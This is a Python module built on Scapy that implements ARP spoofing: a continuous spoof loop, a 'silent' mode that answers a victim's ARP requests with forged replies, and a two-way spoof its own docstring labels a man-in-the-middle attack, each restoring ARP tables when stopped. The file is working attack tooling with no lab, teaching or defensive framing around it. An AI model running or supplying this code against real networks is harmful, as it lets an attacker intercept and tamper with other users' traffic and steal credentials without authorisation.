from scapy.all import *
from helper import *
import threading
import time

class arp:

    def __init__(self):
        self.stop_event = threading.Event()
    
    @staticmethod    
    def restore_arp_table(target_ip, spoofed_ip, iface):
        """
        Restore the arp entry for spoofed_ip in the ARP table of target_ip
        """
        spoofed_mac = get_mac_address(spoofed_ip, iface)
        target_mac = get_mac_address(target_ip, iface)
        restorepacket = ARP(op=2, pdst=target_ip, psrc=spoofed_ip, hwsrc=spoofed_mac, hwdst=target_mac)
        send(restorepacket, verbose=False, iface=iface, count=3)
        print("Restored ARP table of %s" % target_ip)

    @staticmethod
    def send_spoof_packet(target_ip, spoofed_ip, iface):
        """
        Send a spoofing packet
        """
        target_mac = get_mac_address(target_ip, iface)
        self_mac = get_if_hwaddr(iface)
        packet = Ether(dst=target_mac, src=self_mac)/ARP(op=2, pdst=target_ip, psrc=spoofed_ip, hwdst=target_mac, hwsrc=self_mac)
        sendp(packet, verbose=False, iface=iface)

    def continuous_arp_spoof(self, target_ip, spoofed_ip, interval, iface):
        """
        start a loop that continuously sends spoofing packets, interval in seconds
        """
        print("Starting contiuous arp spoof from %s to %s with interval %d seconds" % (target_ip, spoofed_ip, interval))
        packet = ARP(op=2, pdst=target_ip, psrc=spoofed_ip)
        #send(packet, inter=interval, loop=True, verbose=False, iface=iface)
        while not self.stop_event.is_set():
            send(packet, verbose=False, iface=iface)
            time.sleep(interval)
        print("Stopping continuous ARP spoof")
        arp.restore_arp_table(target_ip, spoofed_ip, iface)

    def silent_arp_spoof(self, target_ip, spoofed_ip, iface):
        """
        Start the silent arp spoofing
        """
        print("Starting silent arp spoof of %s to %s" % (target_ip, spoofed_ip))
        arp.send_spoof_packet(target_ip, spoofed_ip, iface)
        
        def handle_arp_packet(packet):
            if packet.haslayer(ARP) and packet[ARP].op == 1:
                if packet[ARP].psrc == target_ip and packet[ARP].pdst == spoofed_ip:
                    print("Got arp request from %s to %s" % (target_ip, spoofed_ip))
                    arp.send_spoof_packet(target_ip, spoofed_ip, iface)
                    time.sleep(0.5)
                    arp.send_spoof_packet(target_ip, spoofed_ip, iface)
                    time.sleep(0.5)
                    arp.send_spoof_packet(target_ip, spoofed_ip, iface)
                    print("Send spoofed packets: %s is at %s" % (spoofed_ip, get_if_hwaddr(iface)))
                elif packet[ARP].psrc == spoofed_ip and packet[ARP].pdst == target_ip:
                    print("Caught arp request from %s to %s, ignoring" % ({spoofed_ip}, target_ip))
        
        while not self.stop_event.is_set():
            sniff(filter="arp", prn=handle_arp_packet, store=0, timeout=1)
        print("Stopping silent ARP spoofing")
        arp.restore_arp_table(target_ip, spoofed_ip, iface)

    def two_way_arp_spoof(self, ip1, ip2, interval, iface):
        """
        Start a two way ARP spoof for MITM atack
        """
        print("Starting a two way ARP spoof on %s and %s, with an interval of %d seconds" % (ip1, ip2, interval))
        self.two_way_event = threading.Event()
        self.ip1 = ip1
        self.ip2 = ip2
        self.iface = iface
        
        while not self.stop_event.is_set():
            arp.send_spoof_packet(ip1, ip2, iface)
            arp.send_spoof_packet(ip2, ip1, iface)
            if self.stop_event.wait(interval):
                break
        
        arp.restore_arp_table(self.ip1, self.ip2, self.iface)
        arp.restore_arp_table(self.ip2, self.ip1, self.iface)
            
        
    def stop_spoof(self):
        print("Stopping ARP spoof")
        self.stop_event.set()
        
